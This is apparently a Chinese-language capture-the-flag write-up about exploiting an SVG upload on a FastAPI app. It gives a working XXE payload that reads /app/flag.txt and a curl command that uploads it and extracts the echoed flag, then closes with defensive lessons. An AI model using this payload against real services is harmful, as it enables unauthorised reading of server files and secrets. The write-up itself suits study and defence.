## 题解

### 入口与指纹

FastAPI（`/docs`、`/openapi.json`），路由只有 `GET /`、`POST /`、`GET /ping`、`GET /hint`。
`POST /` 是 multipart，字段 `name`/`surname`/`address`/`image`（`Profile Image (SVG)`）。

`GET /hint` 直接给出应用目录树，其中包含 **`app/flag.txt`**，所以目标是文件读。

### 关键观察

**1. 上传的 SVG 会被服务端解析后再回显。**

上传含外部实体的 SVG：

```xml
<?xml version="1.0"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///app/flag.txt"> ]>
<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><text>&xxe;</text></svg>
```

响应里的 `Current Image:` 直接变成：

```html
<div><svg ...><text>flag{...}</text></svg></div>
```

说明服务端用支持 DTD 的 XML 解析器处理上传内容，并把解析结果回显。

**2. 因为回显是「解析后的 SVG」，所以不需要外带通道。**

`{{7*7}}` 原样输出（不是模板），`<script>` 也不执行 —— 只有 XML 实体展开这一条路。

### 利用链

```bash
T=$(head -1 .target)
cat > x.svg <<'XML'
<?xml version="1.0"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///app/flag.txt"> ]>
<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><text>&xxe;</text></svg>
XML
curl -sS -F 'name=a' -F 'surname=b' -F 'address=c' \
  -F 'image=@x.svg;filename=x.svg;type=image/svg+xml' "http://$T/" \
| grep -o 'flag{[^}]*}'
```

### flag 位置

`/app/flag.txt`，通过 SVG 的 XXE 实体展开后回显。

## 复盘

- **「只允许 SVG」不等于安全。** SVG 是 XML，天然支持 DTD 与外部实体；
  `image/svg+xml` 的校验通常只看 `Content-Type` 或 `<svg` 前缀。
- **回显解析结果时，XXE 就是文件读。** 不需要把数据发到外部服务器。
- `/hint` 这种「目录列表」页要优先看：它把 `flag.txt` 的位置直接写出来了。
